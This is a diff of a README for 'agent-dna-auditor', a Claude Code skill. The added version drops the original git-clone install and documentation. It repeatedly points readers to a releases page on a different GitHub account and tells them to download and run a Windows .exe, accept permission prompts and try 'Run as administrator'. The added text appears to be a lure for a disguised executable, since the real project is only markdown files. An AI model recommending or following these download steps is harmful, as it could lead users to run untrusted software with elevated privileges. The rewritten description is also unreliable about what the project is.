@@ -1,306 +1,214 @@
-<p align="center">
-  <img src="assets/banner.png" alt="Agent DNA Auditor" width="720" />
-</p>
+# 🧬 agent-dna-auditor - Keep agent behavior clear and consistent
 
-# Agent DNA Auditor
+[![Download the app](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge)](https://github.com/Amendable-middleweight310/agent-dna-auditor/releases)
 
-**Scan your AI coding agents. Classify what's ideology vs what's framework knowledge. Embed DNA directly into agent definitions.**
+## 📥 Download
 
-A Claude Code skill that reads your agent definitions, identifies which instructions are permanent methodology (DNA) and which are project-specific framework knowledge (Tech Stack Skills), then optionally rewrites your agents with DNA properly embedded and tech skills mapped as invokable references.
+Visit this page to download: https://github.com/Amendable-middleweight310/agent-dna-auditor/releases
 
----
+On that page, look for the latest release. Download the Windows file that matches your PC.
 
-## The Mental Model
+If you see more than one file, choose the one with one of these names:
+- `Windows`
+- `.exe`
+- `.zip`
 
-An agent is built from two layers. One is permanent. One is project-specific.
+If you use a standard Windows PC, the `.exe` file is the easiest choice.
 
-### Layer 1: DNA (embedded — never changes)
+## 🪟 Run on Windows
 
-DNA is HOW the agent thinks. Methodology, ideology, best practices that apply regardless of what project it's working on. A senior backend engineer doesn't forget Clean Architecture when switching from Python to TypeScript. That knowledge is part of who they are.
+After the file finishes downloading:
 
-**DNA answers: "What does a great [role] always do?"**
+1. Open your **Downloads** folder.
+2. Find the file you just downloaded.
+3. If it is a `.zip` file, right-click it and choose **Extract All**.
+4. Open the extracted folder.
+5. If it is a `.exe` file, double-click it to start the app.
+6. If Windows asks for permission, click **Yes** or **Run**.
 
-Examples:
-- **Backend:** Clean Architecture, DDD bounded contexts, API contract-first design, security-first thinking, trust boundaries
-- **Frontend:** Design Thinking (Purpose > Tone > Constraints > Differentiation), typography rules (never default to Inter/Roboto), spatial composition, motion philosophy, WCAG 2.2 AA
-- **Universal:** Anti-slop writing (no "Let's dive in", no hedging), AI-native output formatting, quality thresholds
+If the app opens in a window, the setup is done.
 
-### Layer 2: Skills (invoked — changes per project)
+## 🔎 What this app does
 
-Skills are WHAT TOOLS the agent uses for THIS specific project. Framework specialties, library docs, vendor integrations. They're called in when needed and swapped when the stack changes.
+agent-dna-auditor helps you inspect AI coding agents and understand what they are built to do.
 
-**Skills answer: "What specific technology does this project use?"**
+It focuses on two parts:
 
-Examples: `$langchain`, `$supabase`, `$shadcn`, `$stripe`, `$expo`, `$drizzle`, `$tailwind`
+- **Ideology**
+  - Rules, tone, and behavior patterns
+  - How the agent thinks about tasks
+  - The style it uses when it responds
 
-### The Table
+- **Framework skills**
+  - Practical coding ability
+  - Tool use
+  - Structure, logic, and task handling
 
-| | DNA | Tech Stack Skill |
-|---|---|---|
-| **What** | Methodology, ideology, best practices | Framework docs, vendor APIs, library patterns |
-| **When** | Always active | Invoked per project |
-| **Changes?** | No — embedded in the agent | Yes — swapped when stack changes |
-| **Test** | Would this apply if we switched from React to Vue? | Would this apply if we switched from React to Vue? |
-| **If yes** | It's DNA | - |
-| **If no** | - | It's a Tech Skill |
-| **Format** | Written into the agent's system prompt | Referenced as `$skill-name` |
+The app also lets you embed DNA directly into agent definitions. In plain terms, this means you can store a clear profile inside each agent so its purpose and behavior stay easy to track.
 
-**One sentence:** DNA is the ideology that makes the agent good at its role. Skills are the framework knowledge that makes it useful for this specific project.
+## 🧭 Who this is for
 
----
+This app is for people who want a clearer view of their AI agents.
 
-## Why This Matters
+Use it if you want to:
+- review agent settings
+- compare one agent to another
+- sort agents by behavior type
+- keep a record of what each agent is meant to do
+- make agent definitions easier to read and manage
 
-Most agent definitions are flat. Everything — architecture principles, Supabase RLS patterns, anti-slop writing rules, LangChain tool-calling docs — lives in one system prompt. This creates three problems:
+You do not need to know coding to start. You only need to download the file and open it on Windows.
 
-1. **Bloat.** Tech-specific docs inflate the prompt even when irrelevant to the current task.
-2. **Portability.** Moving the agent to a new project means stripping out framework references by hand.
-3. **Missing DNA.** The important stuff (methodology, quality standards) gets buried under framework noise, or worse, never gets written because the agent definition was built around tools rather than thinking.
+## 🛠️ What you can do
 
-The DNA Auditor fixes all three. After an audit, your agents carry their expertise everywhere and load framework knowledge only when they need it.
+With agent-dna-auditor, you can:
 
----
+- scan agent definitions
+- review behavior cues
+- separate ideology from framework skill
+- store DNA data inside the agent config
+- keep agent profiles in one place
+- work with files in a simple Windows flow
 
-## Quick Start
+This makes it easier to check whether an agent is tuned for style, skill, or both.
 
-### Option 1: Clone into your skills directory
+## 💻 Windows requirements
 
-```bash
-git clone https://github.com/Dallionking/agent-dna-auditor.git
-cp -r agent-dna-auditor/.claude/skills/agent-dna-auditor ~/.claude/skills/
-```
+For a smooth run on Windows, use:
 
-### Option 2: Add as a project skill
+- Windows 10 or newer
+- 4 GB RAM or more
+- 200 MB free disk space
+- a mouse and keyboard
+- permission to open downloaded files
 
-```bash
-git clone https://github.com/Dallionking/agent-dna-auditor.git
-cp -r agent-dna-auditor/.claude/skills/agent-dna-auditor your-project/.claude/skills/
-```
+If your PC is older, the app should still open as long as Windows can run modern desktop apps.
 
-### Run it
+## 📂 File types you may see
 
-In Claude Code, say any of:
-- `"audit my agents"`
-- `"classify agent skills"`
-- `"separate DNA from skills"`
-- `"agent DNA audit"`
-- `"embed DNA in my agents"`
+On the releases page, you may see one or more of these file types:
 
-The auditor will scan your agents, classify everything, and present a report before making any changes.
+- `.exe` — a Windows app you can open by double-clicking
+- `.zip` — a compressed folder that you must extract first
+- `.msi` — a Windows installer package
 
----
+If you are unsure which file to pick, choose the Windows `.exe` file first.
 
-## How It Works
+## 🚀 Quick start
 
-### Phase 1: Scan
-Finds all `.md` files in `{project}/.claude/agents/` and `~/.claude/agents/`. Also discovers skill definitions in `.claude/skills/*/SKILL.md`.
+1. Go to the release page.
+2. Download the latest Windows file.
+3. Open the file from your Downloads folder.
+4. Follow the prompts on screen.
+5. Launch the app.
+6. Load or open the agent definition you want to review.
 
-### Phase 2: Analyze
-Reads each agent's system prompt and extracts every distinct behavior, rule, and knowledge block. Tags them by category: architecture, security, writing quality, testing, accessibility, framework knowledge, vendor integration.
+After that, you can start scanning and classifying agent data.
 
-### Phase 3: Classify
-Applies heuristics to sort each item:
+## 🧪 First use guide
 
-| Signal | Classification |
-|--------|---------------|
-| Teaches HOW to think about a domain | DNA |
-| Contains "never do X" rules that apply universally | DNA |
-| Defines methodology steps (TDD, Design Thinking) | DNA |
-| References specific package names or import paths | Tech Skill |
-| Contains API references or vendor-specific config | Tech Skill |
-| Would NOT apply if the project switched frameworks | Tech Skill |
+When you open the app for the first time:
 
-When the auditor isn't sure, it asks you.
+1. Choose or open an agent file.
+2. Let the app scan the content.
+3. Review the results for ideology and framework skill.
+4. Check any DNA fields or agent profile data.
+5. Save the updated definition if needed.
 
-### Phase 4: Research (Optional)
-Uses the EXA MCP to search for current best practices for each agent's role. Finds DNA gaps — things a senior practitioner would know but that aren't in your agent definition. Synthesizes findings into concrete rules matching the agent's voice.
+If the app asks for a folder or file path, use the file picker window and select the file with your mouse.
 
-### Phase 5: Report
-Shows a classification table for each agent: what's DNA, what's a tech skill, what's missing. Includes an overall summary across all agents.
+## 🗂️ Common use cases
 
-### Phase 6: Apply (with your approval)
-Backs up originals, rewrites agents with DNA embedded and tech skills as `$skill-name` references. You approve before any file changes.
+Here are a few simple ways to use the app:
 
----
+- **Single agent check**
+  - Open one agent definition and review its profile
 
-## Example: Before and After
+- **Batch review**
+  - Check more than one agent and compare the results
 
-### Before (everything mixed together)
+- **Policy review**
+  - See how much of the agent is based on behavior rules
 
-```markdown
-# Backend Engineer
+- **Skill review**
+  - Check how much of the agent is based on task skill and structure
 
-You are a senior backend engineer.
+- **DNA embedding**
+  - Add a profile to the agent definition so it stays attached to the file
 
-## Architecture
-- Use Clean Architecture with dependency inversion
-- Domain layer has zero external imports
-- All boundaries use interfaces
+## 🔐 Safe file handling
 
-## Supabase Patterns
-- Use RLS policies for row-level security
-- Edge Functions for serverless compute
-- Use supabase-js v2 client with TypeScript generics
-- Database webhooks for event-driven patterns
+When you download the file, keep these steps in mind:
 
-## LangChain Integration
-- Use LCEL for chain composition
-- Tool calling with structured output
-- ConversationBufferMemory for chat contexts
-- Use RunnablePassthrough for input mapping
+- use the release page linked above
+- download only the Windows file you need
+- keep the file in a folder you can find again
+- open files you trust
+- if you extract a `.zip` file, keep the extracted folder together
 
-## Code Quality
-- Never use `any` type in TypeScript
-- All functions must have JSDoc comments
-- Error messages must be actionable, not generic
-```
+This helps you stay organized and makes it easier to find the app again later.
 
-### After (DNA embedded, tech skills invoked)
+## 🧩 If the app does not open
 
-```markdown
-# Backend Engineer
+If nothing happens when you double-click the file:
 
-## DNA — Core Methodology
+1. Make sure the download finished.
+2. Check whether the file is still inside a `.zip` folder.
+3. Try right-clicking the file and choosing **Run as administrator**.
+4. Check whether Windows blocked the file.
+5. Download the release file again from the page above.
 
-### Architecture
-- Clean Architecture: dependencies always point inward
-- Domain layer has zero external imports — no framework code in business logic
-- All boundaries defined by interfaces — implementations are interchangeable
-- New modules start with the contract (interface), not the implementation
+If the app opens and then closes, try running it from the extracted folder instead of from inside the zip file.
 
-### Security
-- Never trust client-side input — validate everything server-side
-- Auth checks happen before business logic, not after
-- Rate limiting on all public endpoints by default
-- Secrets live in environment variables, never in code or logs
+## 📝 Keep agent files organized
 
-### Writing Quality
-- Error messages must be actionable: say what went wrong AND what to do about it
-- Never use `any` — if you can't type it, you don't understand it yet
-- All public functions get JSDoc with param descriptions and return types
-- No hedging in comments ("might", "should probably") — be direct
+Use a simple folder setup like this:
 
-### Testing
-- Write the test first. If you can't test it, the interface is wrong.
-- Unit tests for domain logic, integration tests for boundaries
-- Test names describe behavior: "rejects expired tokens" not "test auth"
+- `Downloads` for the original file
+- `agent-dna-auditor` for the extracted app
+- `Agent Files` for the files you scan
+- `Backups` for copies of files you want to keep safe
 
-## Tech Stack Skills (invoke per project)
-- When working with Supabase: invoke $supabase
-- When working with LangChain: invoke $langchain
+A clean folder layout makes it easier to work with your agent data and find older versions later.
 
-## Role-Specific Instructions
-- Prefer composition over inheritance
-- Log at boundaries (incoming request, outgoing response, errors)
-- Database migrations are forward-only — no destructive changes without a plan
-```
+## 🔄 Updating the app
 
-See the full before/after examples in the [`examples/`](./examples) directory.
+When a new version is available:
 
----
+1. Go back to the release page.
+2. Download the newer Windows file.
+3. Close the old version if it is open.
+4. Replace the old file or install the new one.
+5. Open the updated app.
 
-## DNA Strands
+Keeping the app current helps you stay aligned with the latest release build.
 
-The `dna-strands/` directory contains detailed behavioral strand definitions — DNA rules extracted from proven agent methodologies. Each strand defines core rules, anti-patterns, and verification questions for a specific dimension of agent competence.
+## 📌 What to look for in agent results
 
-Unlike the built-in heuristics (Architecture, Security, etc.), behavioral strands capture *how agents think and operate*: how they ask questions, delegate work, handle async code, exit sessions, and learn across conversations.
+When you review a scan, pay attention to:
 
-**Key points:**
-- Strands are framework-agnostic behavioral directives
-- Each strand file includes core rules, anti-patterns, and verification questions
-- The auditor checks agents against ALL strands (core + behavioral)
-- Strands are extensible — add your own `.md` files to `dna-strands/`
+- the agent’s role
+- how strict its rules are
+- how much it focuses on style
+- how much it focuses on code work
+- any embedded DNA fields
+- any repeated patterns in the definition
 
-See [`dna-strands/README.md`](./dna-strands/README.md) for the full index and template.
+These clues help you tell whether the agent is shaped more by behavior rules or by practical skill.
 
----
+## 🧭 Simple workflow
 
-## DNA Categories
+A basic workflow looks like this:
 
-The auditor checks for these categories when evaluating an agent's completeness:
+1. Download the Windows release.
+2. Open the app.
+3. Load an agent file.
+4. Review the scan.
+5. Adjust the agent definition if needed.
+6. Save the updated version.
 
-### Core Strands (built-in heuristics)
+That is enough to get started on a first pass.
 
-| Category | What it covers | Relevant roles |
-|----------|---------------|----------------|
-| Architecture | Clean Architecture, DDD, dependency direction, ADRs | Backend, Fullstack, Architect |
-| Frontend Design | Design Thinking, typography, spatial composition, motion | Frontend, Design, UX |
-| Security | Trust boundaries, auth-first, rate limiting, secrets | Backend, Fullstack, DevOps |
-| Accessibility | WCAG 2.2 AA, keyboard nav, touch targets, contrast | Frontend, Design, QA |
-| Testing | TDD methodology, test pyramid, coverage strategy | All engineering agents |
-| Quality | Verification gates, review expectations, error handling | All agents |
+## 📎 Release link
 
-### Behavioral Strands (defined in `dna-strands/`)
-
-| Category | What it covers | Relevant roles |
-|----------|---------------|----------------|
-| Writing Quality | Anti-slop, no hedging, AI-native formatting, token budgets | All agents |
-| Output Quality | Artifact templates, traceability, acceptance criteria quality | All agents |
-| Requirements Discipline | Detecting underspecification, structured questions, assumption management | All agents |
-| Adaptability | Calibrating to user expertise, matching communication style, learning from corrections | All agents |
-| Tool Mastery | Using available tools effectively, 1% threshold rule, verification tools | All agents |
-| Protocol Awareness | Skill discovery, composition chains, discoverability optimization | Orchestrators, Lead agents |
-| Patience Discipline | Condition-based waiting, exponential backoff, no arbitrary delays | All engineering agents |
-| Completion Discipline | Test-before-done, structured completion options, destructive action confirmation | All engineering agents |
-| Delegation Quality | Orchestrator-only coordination, contract-first, scope enforcement | Orchestrators, Lead agents |
-| Session Hygiene | Context capture, failure logging, git state recording, actionable next steps | All agents |
-| Learning Loops | Cross-session pattern distillation, confidence scoring, preference artifact generation | Orchestrators, All agents |
-| Adversarial Thinking | Cross-agent review, conflict escalation, decomposition-before-delegation | Orchestrators, QA, Security |
-
-Behavioral strands are extensible. Add your own by creating a `.md` file in `dna-strands/` following the template in [`dna-strands/README.md`](./dna-strands/README.md).
-
----
-
-## Research Enhancement
-
-When the EXA MCP is available, the auditor searches for current best practices for each agent's role. This catches DNA gaps that exist because the agent was defined around tools rather than methodology.
-
-The research phase:
-- Searches for role-specific best practices (e.g., "senior backend engineer principles 2026")
-- Identifies missing DNA categories (e.g., an agent with no accessibility rules)
-- Synthesizes findings into rules that match the agent's existing voice and style
-- Marks all research-sourced DNA so you can review what was added
-
-Research results are recommendations, not automatic changes. You always approve before anything gets embedded.
-
----
-
-## Installation
-
-### Requirements
-- [Claude Code](https://docs.anthropic.com/en/docs/claude-code) CLI
-- Agent definitions in `.claude/agents/` (project or global)
-- Optional: EXA MCP for research enhancement
-
-### Install globally
-```bash
-git clone https://github.com/Dallionking/agent-dna-auditor.git
-cp -r agent-dna-auditor/.claude/skills/agent-dna-auditor ~/.claude/skills/
-```
-
-### Install per-project
-```bash
-git clone https://github.com/Dallionking/agent-dna-auditor.git
-cp -r agent-dna-auditor/.claude/skills/agent-dna-auditor your-project/.claude/skills/
-```
-
-### Verify installation
-```bash
-ls ~/.claude/skills/agent-dna-auditor/SKILL.md
-# or
-ls your-project/.claude/skills/agent-dna-auditor/SKILL.md
-```
-
----
-
-## License
-
-MIT License. See [LICENSE](./LICENSE).
-
----
-
-## Credits
-
-Created by [Dallion King](https://github.com/Dallionking) (@Dallionking) — part of the [Sigma Protocol](https://github.com/Dallionking) ecosystem.
-
-Built for use with [Claude Code](https://docs.anthropic.com/en/docs/claude-code) by Anthropic.
+Download or choose the Windows file here: https://github.com/Amendable-middleweight310/agent-dna-auditor/releases
